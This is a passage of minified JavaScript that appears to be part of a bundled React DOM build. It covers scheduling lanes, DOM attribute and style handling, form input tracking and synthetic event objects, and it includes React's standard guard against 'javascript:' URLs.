                return (c.displayName || "Context") + ".Provider";
            case P:
                return (c._context.displayName || "Context") + ".Consumer";
            case F:
                var u = c.render;
                return c = c.displayName,
                c || (c = u.displayName || u.name || "",
                c = c !== "" ? "ForwardRef(" + c + ")" : "ForwardRef"),
                c;
            case M:
                return u = c.displayName || null,
                u !== null ? u : V(c.type) || "Memo";
            case C:
                u = c._payload,
                c = c._init;
                try {
                    return V(c(u))
                } catch {}
            }
        return null
    }
    var R = Array.isArray
      , _ = e.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , $ = t.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , z = {
        pending: !1,
        data: null,
        method: null,
        action: null
    }
      , K = []
      , j = -1;
    function ee(c) {
        return {
            current: c
        }
    }
    function ie(c) {
        0 > j || (c.current = K[j],
        K[j] = null,
        j--)
    }
    function ae(c, u) {
        j++,
        K[j] = c.current,
        c.current = u
    }
    var he = ee(null)
      , me = ee(null)
      , Pe = ee(null)
      , _e = ee(null);
    function Fe(c, u) {
        switch (ae(Pe, u),
        ae(me, c),
        ae(he, null),
        u.nodeType) {
        case 9:
        case 11:
            c = (c = u.documentElement) && (c = c.namespaceURI) ? $6(c) : 0;
            break;
        default:
            if (c = u.tagName,
            u = u.namespaceURI)
                u = $6(u),
                c = z6(u, c);
            else
                switch (c) {
                case "svg":
                    c = 1;
                    break;
                case "math":
                    c = 2;
                    break;
                default:
                    c = 0
                }
        }
        ie(he),
        ae(he, c)
    }
    function Je() {
        ie(he),
        ie(me),
        ie(Pe)
    }
    function rt(c) {
        c.memoizedState !== null && ae(_e, c);
        var u = he.current
          , d = z6(u, c.type);
        u !== d && (ae(me, c),
        ae(he, d))
    }
    function xt(c) {
        me.current === c && (ie(he),
        ie(me)),
        _e.current === c && (ie(_e),
        Zh._currentValue = z)
    }
    var Tt = Object.prototype.hasOwnProperty
      , Qe = r.unstable_scheduleCallback
      , Ye = r.unstable_cancelCallback
      , Bt = r.unstable_shouldYield
      , Dr = r.unstable_requestPaint
      , Cr = r.unstable_now
      , se = r.unstable_getCurrentPriorityLevel
      , le = r.unstable_ImmediatePriority
      , Te = r.unstable_UserBlockingPriority
      , Ue = r.unstable_NormalPriority
      , Re = r.unstable_LowPriority
      , $e = r.unstable_IdlePriority
      , st = r.log
      , yt = r.unstable_setDisableYieldValue
      , vt = null
      , Z = null;
    function N(c) {
        if (typeof st == "function" && yt(c),
        Z && typeof Z.setStrictMode == "function")
            try {
                Z.setStrictMode(vt, c)
            } catch {}
    }
    var U = Math.clz32 ? Math.clz32 : Ee
      , ne = Math.log
      , J = Math.LN2;
    function Ee(c) {
        return c >>>= 0,
        c === 0 ? 32 : 31 - (ne(c) / J | 0) | 0
    }
    var Ie = 256
      , re = 4194304;
    function Nt(c) {
        var u = c & 42;
        if (u !== 0)
            return u;
        switch (c & -c) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
            return 64;
        case 128:
            return 128;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return c & 4194048;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return c & 62914560;
        case 67108864:
            return 67108864;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 0;
        default:
            return c
        }
    }
    function Yt(c, u, d) {
        var g = c.pendingLanes;
        if (g === 0)
            return 0;
        var w = 0
          , A = c.suspendedLanes
          , q = c.pingedLanes;
        c = c.warmLanes;
        var Q = g & 134217727;
        return Q !== 0 ? (g = Q & ~A,
        g !== 0 ? w = Nt(g) : (q &= Q,
        q !== 0 ? w = Nt(q) : d || (d = Q & ~c,
        d !== 0 && (w = Nt(d))))) : (Q = g & ~A,
        Q !== 0 ? w = Nt(Q) : q !== 0 ? w = Nt(q) : d || (d = g & ~c,
        d !== 0 && (w = Nt(d)))),
        w === 0 ? 0 : u !== 0 && u !== w && (u & A) === 0 && (A = w & -w,
        d = u & -u,
        A >= d || A === 32 && (d & 4194048) !== 0) ? u : w
    }
    function wt(c, u) {
        return (c.pendingLanes & ~(c.suspendedLanes & ~c.pingedLanes) & u) === 0
    }
    function zt(c, u) {
        switch (c) {
        case 1:
        case 2:
        case 4:
        case 8:
        case 64:
            return u + 250;
        case 16:
        case 32:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return u + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return -1;
        case 67108864:
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1
        }
    }
    function zi() {
        var c = Ie;
        return Ie <<= 1,
        (Ie & 4194048) === 0 && (Ie = 256),
        c
    }
    function Ke() {
        var c = re;
        return re <<= 1,
        (re & 62914560) === 0 && (re = 4194304),
        c
    }
    function jo(c) {
        for (var u = [], d = 0; 31 > d; d++)
            u.push(c);
        return u
    }
    function oo(c, u) {
        c.pendingLanes |= u,
        u !== 268435456 && (c.suspendedLanes = 0,
        c.pingedLanes = 0,
        c.warmLanes = 0)
    }
    function ji(c, u, d, g, w, A) {
        var q = c.pendingLanes;
        c.pendingLanes = d,
        c.suspendedLanes = 0,
        c.pingedLanes = 0,
        c.warmLanes = 0,
        c.expiredLanes &= d,
        c.entangledLanes &= d,
        c.errorRecoveryDisabledLanes &= d,
        c.shellSuspendCounter = 0;
        var Q = c.entanglements
          , ce = c.expirationTimes
          , ve = c.hiddenUpdates;
        for (d = q & ~d; 0 < d; ) {
            var We = 31 - U(d)
              , ke = 1 << We;
            Q[We] = 0,
            ce[We] = -1;
            var Se = ve[We];
            if (Se !== null)
                for (ve[We] = null,
                We = 0; We < Se.length; We++) {
                    var Be = Se[We];
                    Be !== null && (Be.lane &= -536870913)
                }
            d &= ~ke
        }
        g !== 0 && di(c, g, 0),
        A !== 0 && w === 0 && c.tag !== 0 && (c.suspendedLanes |= A & ~(q & ~u))
    }
    function di(c, u, d) {
        c.pendingLanes |= u,
        c.suspendedLanes &= ~u;
        var g = 31 - U(u);
        c.entangledLanes |= u,
        c.entanglements[g] = c.entanglements[g] | 1073741824 | d & 4194090
    }
    function jr(c, u) {
        var d = c.entangledLanes |= u;
        for (c = c.entanglements; d; ) {
            var g = 31 - U(d)
              , w = 1 << g;
            w & u | c[g] & u && (c[g] |= u),
            d &= ~w
        }
    }
    function bs(c) {
        switch (c) {
        case 2:
            c = 1;
            break;
        case 8:
            c = 4;
            break;
        case 32:
            c = 16;
            break;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            c = 128;
            break;
        case 268435456:
            c = 134217728;
            break;
        default:
            c = 0
        }
        return c
    }
    function ms(c) {
        return c &= -c,
        2 < c ? 8 < c ? (c & 134217727) !== 0 ? 32 : 268435456 : 8 : 2
    }
    function fe() {
        var c = $.p;
        return c !== 0 ? c : (c = window.event,
        c === void 0 ? 32 : aS(c.type))
    }
    function ye(c, u) {
        var d = $.p;
        try {
            return $.p = c,
            u()
        } finally {
            $.p = d
        }
    }
    var Ce = Math.random().toString(36).slice(2)
      , Ne = "__reactFiber$" + Ce
      , je = "__reactProps$" + Ce
      , nt = "__reactContainer$" + Ce
      , At = "__reactEvents$" + Ce
      , ot = "__reactListeners$" + Ce
      , bt = "__reactHandles$" + Ce
      , mt = "__reactResources$" + Ce
      , Ct = "__reactMarker$" + Ce;
    function lt(c) {
        delete c[Ne],
        delete c[je],
        delete c[At],
        delete c[ot],
        delete c[bt]
    }
    function St(c) {
        var u = c[Ne];
        if (u)
            return u;
        for (var d = c.parentNode; d; ) {
            if (u = d[nt] || d[Ne]) {
                if (d = u.alternate,
                u.child !== null || d !== null && d.child !== null)
                    for (c = H6(c); c !== null; ) {
                        if (d = c[Ne])
                            return d;
                        c = H6(c)
                    }
                return u
            }
            c = d,
            d = c.parentNode
        }
        return null
    }
    function Vt(c) {
        if (c = c[Ne] || c[nt]) {
            var u = c.tag;
            if (u === 5 || u === 6 || u === 13 || u === 26 || u === 27 || u === 3)
                return c
        }
        return null
    }
    function Ht(c) {
        var u = c.tag;
        if (u === 5 || u === 26 || u === 27 || u === 6)
            return c.stateNode;
        throw Error(o(33))
    }
    function De(c) {
        var u = c[mt];
        return u || (u = c[mt] = {
            hoistableStyles: new Map,
            hoistableScripts: new Map
        }),
        u
    }
    function Ge(c) {
        c[Ct] = !0
    }
    var kt = new Set
      , mn = {};
    function Lt(c, u) {
        Le(c, u),
        Le(c + "Capture", u)
    }
    function Le(c, u) {
        for (mn[c] = u,
        c = 0; c < u.length; c++)
            kt.add(u[c])
    }
    var te = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$")
      , qo = {}
      , Pt = {};
    function Gt(c) {
        return Tt.call(Pt, c) ? !0 : Tt.call(qo, c) ? !1 : te.test(c) ? Pt[c] = !0 : (qo[c] = !0,
        !1)
    }
    function it(c, u, d) {
        if (Gt(u))
            if (d === null)
                c.removeAttribute(u);
            else {
                switch (typeof d) {
                case "undefined":
                case "function":
                case "symbol":
                    c.removeAttribute(u);
                    return;
                case "boolean":
                    var g = u.toLowerCase().slice(0, 5);
                    if (g !== "data-" && g !== "aria-") {
                        c.removeAttribute(u);
                        return
                    }
                }
                c.setAttribute(u, "" + d)
            }
    }
    function sn(c, u, d) {
        if (d === null)
            c.removeAttribute(u);
        else {
            switch (typeof d) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                c.removeAttribute(u);
                return
            }
            c.setAttribute(u, "" + d)
        }
    }
    function Wt(c, u, d, g) {
        if (g === null)
            c.removeAttribute(d);
        else {
            switch (typeof g) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                c.removeAttribute(d);
                return
            }
            c.setAttributeNS(u, d, "" + g)
        }
    }
    var y, m;
    function S(c) {
        if (y === void 0)
            try {
                throw Error()
            } catch (d) {
                var u = d.stack.trim().match(/\n( *(at )?)/);
                y = u && u[1] || "",
                m = -1 < d.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < d.stack.indexOf("@") ? "@unknown:0:0" : ""
            }
        return `
` + y + c + m
    }
    var G = !1;
    function oe(c, u) {
        if (!c || G)
            return "";
        G = !0;
        var d = Error.prepareStackTrace;
        Error.prepareStackTrace = void 0;
        try {
            var g = {
                DetermineComponentFrameRoot: function() {
                    try {
                        if (u) {
                            var ke = function() {
                                throw Error()
                            };
                            if (Object.defineProperty(ke.prototype, "props", {
                                set: function() {
                                    throw Error()
                                }
                            }),
                            typeof Reflect == "object" && Reflect.construct) {
                                try {
                                    Reflect.construct(ke, [])
                                } catch (Be) {
                                    var Se = Be
                                }
                                Reflect.construct(c, [], ke)
                            } else {
                                try {
                                    ke.call()
                                } catch (Be) {
                                    Se = Be
                                }
                                c.call(ke.prototype)
                            }
                        } else {
                            try {
                                throw Error()
                            } catch (Be) {
                                Se = Be
                            }
                            (ke = c()) && typeof ke.catch == "function" && ke.catch(function() {})
                        }
                    } catch (Be) {
                        if (Be && Se && typeof Be.stack == "string")
                            return [Be.stack, Se.stack]
                    }
                    return [null, null]
                }
            };
            g.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
            var w = Object.getOwnPropertyDescriptor(g.DetermineComponentFrameRoot, "name");
            w && w.configurable && Object.defineProperty(g.DetermineComponentFrameRoot, "name", {
                value: "DetermineComponentFrameRoot"
            });
            var A = g.DetermineComponentFrameRoot()
              , q = A[0]
              , Q = A[1];
            if (q && Q) {
                var ce = q.split(`
`)
                  , ve = Q.split(`
`);
                for (w = g = 0; g < ce.length && !ce[g].includes("DetermineComponentFrameRoot"); )
                    g++;
                for (; w < ve.length && !ve[w].includes("DetermineComponentFrameRoot"); )
                    w++;
                if (g === ce.length || w === ve.length)
                    for (g = ce.length - 1,
                    w = ve.length - 1; 1 <= g && 0 <= w && ce[g] !== ve[w]; )
                        w--;
                for (; 1 <= g && 0 <= w; g--,
                w--)
                    if (ce[g] !== ve[w]) {
                        if (g !== 1 || w !== 1)
                            do
                                if (g--,
                                w--,
                                0 > w || ce[g] !== ve[w]) {
                                    var We = `
` + ce[g].replace(" at new ", " at ");
                                    return c.displayName && We.includes("<anonymous>") && (We = We.replace("<anonymous>", c.displayName)),
                                    We
                                }
                            while (1 <= g && 0 <= w);
                        break
                    }
            }
        } finally {
            G = !1,
            Error.prepareStackTrace = d
        }
        return (d = c ? c.displayName || c.name : "") ? S(d) : ""
    }
    function be(c) {
        switch (c.tag) {
        case 26:
        case 27:
        case 5:
            return S(c.type);
        case 16:
            return S("Lazy");
        case 13:
            return S("Suspense");
        case 19:
            return S("SuspenseList");
        case 0:
        case 15:
            return oe(c.type, !1);
        case 11:
            return oe(c.type.render, !1);
        case 1:
            return oe(c.type, !0);
        case 31:
            return S("Activity");
        default:
            return ""
        }
    }
    function ze(c) {
        try {
            var u = "";
            do
                u += be(c),
                c = c.return;
            while (c);
            return u
        } catch (d) {
            return `
Error generating stack: ` + d.message + `
` + d.stack
        }
    }
    function at(c) {
        switch (typeof c) {
        case "bigint":
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return c;
        case "object":
            return c;
        default:
            return ""
        }
    }
    function $r(c) {
        var u = c.type;
        return (c = c.nodeName) && c.toLowerCase() === "input" && (u === "checkbox" || u === "radio")
    }
    function ea(c) {
        var u = $r(c) ? "checked" : "value"
          , d = Object.getOwnPropertyDescriptor(c.constructor.prototype, u)
          , g = "" + c[u];
        if (!c.hasOwnProperty(u) && typeof d < "u" && typeof d.get == "function" && typeof d.set == "function") {
            var w = d.get
              , A = d.set;
            return Object.defineProperty(c, u, {
                configurable: !0,
                get: function() {
                    return w.call(this)
                },
                set: function(q) {
                    g = "" + q,
                    A.call(this, q)
                }
            }),
            Object.defineProperty(c, u, {
                enumerable: d.enumerable
            }),
            {
                getValue: function() {
                    return g
                },
                setValue: function(q) {
                    g = "" + q
                },
                stopTracking: function() {
                    c._valueTracker = null,
                    delete c[u]
                }
            }
        }
    }
    function nl(c) {
        c._valueTracker || (c._valueTracker = ea(c))
    }
    function F4(c) {
        if (!c)
            return !1;
        var u = c._valueTracker;
        if (!u)
            return !0;
        var d = u.getValue()
          , g = "";
        return c && (g = $r(c) ? c.checked ? "true" : "false" : c.value),
        c = g,
        c !== d ? (u.setValue(c),
        !0) : !1
    }
    function $0(c) {
        if (c = c || (typeof document < "u" ? document : void 0),
        typeof c > "u")
            return null;
        try {
            return c.activeElement || c.body
        } catch {
            return c.body
        }
    }
    var ik = /[\n"\\]/g;
    function hi(c) {
        return c.replace(ik, function(u) {
            return "\\" + u.charCodeAt(0).toString(16) + " "
        })
    }
    function Tx(c, u, d, g, w, A, q, Q) {
        c.name = "",
        q != null && typeof q != "function" && typeof q != "symbol" && typeof q != "boolean" ? c.type = q : c.removeAttribute("type"),
        u != null ? q === "number" ? (u === 0 && c.value === "" || c.value != u) && (c.value = "" + at(u)) : c.value !== "" + at(u) && (c.value = "" + at(u)) : q !== "submit" && q !== "reset" || c.removeAttribute("value"),
        u != null ? Ex(c, q, at(u)) : d != null ? Ex(c, q, at(d)) : g != null && c.removeAttribute("value"),
        w == null && A != null && (c.defaultChecked = !!A),
        w != null && (c.checked = w && typeof w != "function" && typeof w != "symbol"),
        Q != null && typeof Q != "function" && typeof Q != "symbol" && typeof Q != "boolean" ? c.name = "" + at(Q) : c.removeAttribute("name")
    }
    function U4(c, u, d, g, w, A, q, Q) {
        if (A != null && typeof A != "function" && typeof A != "symbol" && typeof A != "boolean" && (c.type = A),
        u != null || d != null) {
            if (!(A !== "submit" && A !== "reset" || u != null))
                return;
            d = d != null ? "" + at(d) : "",
            u = u != null ? "" + at(u) : d,
            Q || u === c.value || (c.value = u),
            c.defaultValue = u
        }
        g = g ?? w,
        g = typeof g != "function" && typeof g != "symbol" && !!g,
        c.checked = Q ? c.checked : !!g,
        c.defaultChecked = !!g,
        q != null && typeof q != "function" && typeof q != "symbol" && typeof q != "boolean" && (c.name = q)
    }
    function Ex(c, u, d) {
        u === "number" && $0(c.ownerDocument) === c || c.defaultValue === "" + d || (c.defaultValue = "" + d)
    }
    function Wu(c, u, d, g) {
        if (c = c.options,
        u) {
            u = {};
            for (var w = 0; w < d.length; w++)
                u["$" + d[w]] = !0;
            for (d = 0; d < c.length; d++)
                w = u.hasOwnProperty("$" + c[d].value),
                c[d].selected !== w && (c[d].selected = w),
                w && g && (c[d].defaultSelected = !0)
        } else {
            for (d = "" + at(d),
            u = null,
            w = 0; w < c.length; w++) {
                if (c[w].value === d) {
                    c[w].selected = !0,
                    g && (c[w].defaultSelected = !0);
                    return
                }
                u !== null || c[w].disabled || (u = c[w])
            }
            u !== null && (u.selected = !0)
        }
    }
    function k4(c, u, d) {
        if (u != null && (u = "" + at(u),
        u !== c.value && (c.value = u),
        d == null)) {
            c.defaultValue !== u && (c.defaultValue = u);
            return
        }
        c.defaultValue = d != null ? "" + at(d) : ""
    }
    function L4(c, u, d, g) {
        if (u == null) {
            if (g != null) {
                if (d != null)
                    throw Error(o(92));
                if (R(g)) {
                    if (1 < g.length)
                        throw Error(o(93));
                    g = g[0]
                }
                d = g
            }
            d == null && (d = ""),
            u = d
        }
        d = at(u),
        c.defaultValue = d,
        g = c.textContent,
        g === d && g !== "" && g !== null && (c.value = g)
    }
    function Mu(c, u) {
        if (u) {
            var d = c.firstChild;
            if (d && d === c.lastChild && d.nodeType === 3) {
                d.nodeValue = u;
                return
            }
        }
        c.textContent = u
    }
    var sk = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
    function $4(c, u, d) {
        var g = u.indexOf("--") === 0;
        d == null || typeof d == "boolean" || d === "" ? g ? c.setProperty(u, "") : u === "float" ? c.cssFloat = "" : c[u] = "" : g ? c.setProperty(u, d) : typeof d != "number" || d === 0 || sk.has(u) ? u === "float" ? c.cssFloat = d : c[u] = ("" + d).trim() : c[u] = d + "px"
    }
    function z4(c, u, d) {
        if (u != null && typeof u != "object")
            throw Error(o(62));
        if (c = c.style,
        d != null) {
            for (var g in d)
                !d.hasOwnProperty(g) || u != null && u.hasOwnProperty(g) || (g.indexOf("--") === 0 ? c.setProperty(g, "") : g === "float" ? c.cssFloat = "" : c[g] = "");
            for (var w in u)
                g = u[w],
                u.hasOwnProperty(w) && d[w] !== g && $4(c, w, g)
        } else
            for (var A in u)
                u.hasOwnProperty(A) && $4(c, A, u[A])
    }
    function Ax(c) {
        if (c.indexOf("-") === -1)
            return !1;
        switch (c) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
        }
    }
    var ak = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
      , ck = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
    function z0(c) {
        return ck.test("" + c) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : c
    }
    var Px = null;
    function Cx(c) {
        return c = c.target || c.srcElement || window,
        c.correspondingUseElement && (c = c.correspondingUseElement),
        c.nodeType === 3 ? c.parentNode : c
    }
    var Nu = null
      , Du = null;
    function j4(c) {
        var u = Vt(c);
        if (u && (c = u.stateNode)) {
            var d = c[je] || null;
            e: switch (c = u.stateNode,
            u.type) {
            case "input":
                if (Tx(c, d.value, d.defaultValue, d.defaultValue, d.checked, d.defaultChecked, d.type, d.name),
                u = d.name,
                d.type === "radio" && u != null) {
                    for (d = c; d.parentNode; )
                        d = d.parentNode;
                    for (d = d.querySelectorAll('input[name="' + hi("" + u) + '"][type="radio"]'),
                    u = 0; u < d.length; u++) {
                        var g = d[u];
                        if (g !== c && g.form === c.form) {
                            var w = g[je] || null;
                            if (!w)
                                throw Error(o(90));
                            Tx(g, w.value, w.defaultValue, w.defaultValue, w.checked, w.defaultChecked, w.type, w.name)
                        }
                    }
                    for (u = 0; u < d.length; u++)
                        g = d[u],
                        g.form === c.form && F4(g)
                }
                break e;
            case "textarea":
                k4(c, d.value, d.defaultValue);
                break e;
            case "select":
                u = d.value,
                u != null && Wu(c, !!d.multiple, u, !1)
            }
        }
    }
    var Sx = !1;
    function q4(c, u, d) {
        if (Sx)
            return c(u, d);
        Sx = !0;
        try {
            var g = c(u);
            return g
        } finally {
            if (Sx = !1,
            (Nu !== null || Du !== null) && (Sg(),
            Nu && (u = Nu,
            c = Du,
            Du = Nu = null,
            j4(u),
            c)))
                for (u = 0; u < c.length; u++)
                    j4(c[u])
        }
    }
    function ch(c, u) {
        var d = c.stateNode;
        if (d === null)
            return null;
        var g = d[je] || null;
        if (g === null)
            return null;
        d = g[u];
        e: switch (u) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (g = !g.disabled) || (c = c.type,
            g = !(c === "button" || c === "input" || c === "select" || c === "textarea")),
            c = !g;
            break e;
        default:
            c = !1
        }
        if (c)
            return null;
        if (d && typeof d != "function")
            throw Error(o(231, u, typeof d));
        return d
    }
    var ta = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
      , Bx = !1;
    if (ta)
        try {
            var lh = {};
            Object.defineProperty(lh, "passive", {
                get: function() {
                    Bx = !0
                }
            }),
            window.addEventListener("test", lh, lh),
            window.removeEventListener("test", lh, lh)
        } catch {
            Bx = !1
        }
    var Za = null
      , _x = null
      , j0 = null;
    function V4() {
        if (j0)
            return j0;
        var c, u = _x, d = u.length, g, w = "value"in Za ? Za.value : Za.textContent, A = w.length;
        for (c = 0; c < d && u[c] === w[c]; c++)
            ;
        var q = d - c;
        for (g = 1; g <= q && u[d - g] === w[A - g]; g++)
            ;
        return j0 = w.slice(c, 1 < g ? 1 - g : void 0)
    }
    function q0(c) {
        var u = c.keyCode;
        return "charCode"in c ? (c = c.charCode,
        c === 0 && u === 13 && (c = 13)) : c = u,
        c === 10 && (c = 13),
        32 <= c || c === 13 ? c : 0
    }
    function V0() {
        return !0
    }
    function H4() {
        return !1
    }
    function To(c) {
        function u(d, g, w, A, q) {
            this._reactName = d,
            this._targetInst = w,
            this.type = g,
            this.nativeEvent = A,
            this.target = q,
            this.currentTarget = null;
            for (var Q in c)
                c.hasOwnProperty(Q) && (d = c[Q],
                this[Q] = d ? d(A) : A[Q]);
            return this.isDefaultPrevented = (A.defaultPrevented != null ? A.defaultPrevented : A.returnValue === !1) ? V0 : H4,
            this.isPropagationStopped = H4,
            this
        }
        return h(u.prototype, {
            preventDefault: function() {
                this.defaultPrevented = !0;
                var d = this.nativeEvent;
                d && (d.preventDefault ? d.preventDefault() : typeof d.returnValue != "unknown" && (d.returnValue = !1),
                this.isDefaultPrevented = V0)
            },
            stopPropagation: function() {
                var d = this.nativeEvent;
                d && (d.stopPropagation ? d.stopPropagation() : typeof d.cancelBubble != "unknown" && (d.cancelBubble = !0),
                this.isPropagationStopped = V0)
            },
            persist: function() {},
            isPersistent: V0
        }),
        u
    }
    var ol = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function(c) {
            return c.timeStamp || Date.now()
        },
        defaultPrevented: 0,
        isTrusted: 0
    }, H0 = To(ol), uh = h({}, ol, {
        view: 0,
        detail: 0
    }), lk = To(uh), Ix, Ox, fh, G0 = h({}, uh, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Wx,
        button: 0,
        buttons: 0,
        relatedTarget: function(c) {
            return c.relatedTarget === void 0 ? c.fromElement === c.srcElement ? c.toElement : c.fromElement : c.relatedTarget
        },
        movementX: function(c) {
            return "movementX"in c ? c.movementX : (c !== fh && (fh && c.type === "mousemove" ? (Ix = c.screenX - fh.screenX,
            Ox = c.screenY - fh.screenY) : Ox = Ix = 0,
            fh = c),
            Ix)
        },
        movementY: function(c) {
            return "movementY"in c ? c.movementY : Ox
        }
    }), G4 = To(G0), uk = h({}, G0, {
        dataTransfer: 0
    }), fk = To(uk), dk = h({}, uh, {
        relatedTarget: 0
    }), Rx = To(dk), hk = h({}, ol, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }), pk = To(hk), gk = h({}, ol, {
        clipboardData: function(c) {
            return "clipboardData"in c ? c.clipboardData : window.clipboardData
        }
    }), yk = To(gk), bk = h({}, ol, {
        data: 0
    }), K4 = To(bk), mk = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
